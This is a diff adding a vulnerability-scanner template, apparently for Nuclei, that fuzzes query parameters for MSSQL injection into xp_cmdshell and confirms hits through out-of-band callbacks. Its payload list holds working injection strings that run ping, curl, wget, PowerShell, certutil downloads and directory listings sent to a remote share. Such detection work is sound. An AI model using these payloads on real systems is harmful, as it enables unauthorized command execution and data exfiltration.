@@ -1,0 +1,35 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{mssql_oob}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  method: GET
+  path:
+  - '{{BaseURL}}'
+  payloads:
+    mssql_oob:
+    - 1; exec master..xp_cmdshell 'ping -n 1 {{interactsh-url}}'--
+    - 1; exec master..xp_cmdshell 'curl http://{{interactsh-url}}'--
+    - 1; exec master..xp_cmdshell 'nslookup {{interactsh-url}}'--
+    - 1; exec master..xp_cmdshell 'tree C:\ > \\{{interactsh-url}}\share'--
+    - 1; exec master..xp_cmdshell 'dir C:\ > \\{{interactsh-url}}\share'--
+    - 1; exec master..xp_cmdshell 'powershell -Command Invoke-WebRequest http://{{interactsh-url}}'--
+    - 1; exec master..xp_cmdshell 'certutil -urlcache -f http://{{interactsh-url}}
+      test.exe'--
+    - 1; exec master..xp_cmdshell 'wget http://{{interactsh-url}}'--
+  redirects: true
+  stop-at-first-match: true
+id: ai-mssql-xp-cmdshell-oob-fuzzing
+info:
+  author: openai
+  name: MSSQL xp_cmdshell RCE OOB Fuzzing
+  severity: critical
+  tags: mssql,rce,sqli,oob,dast
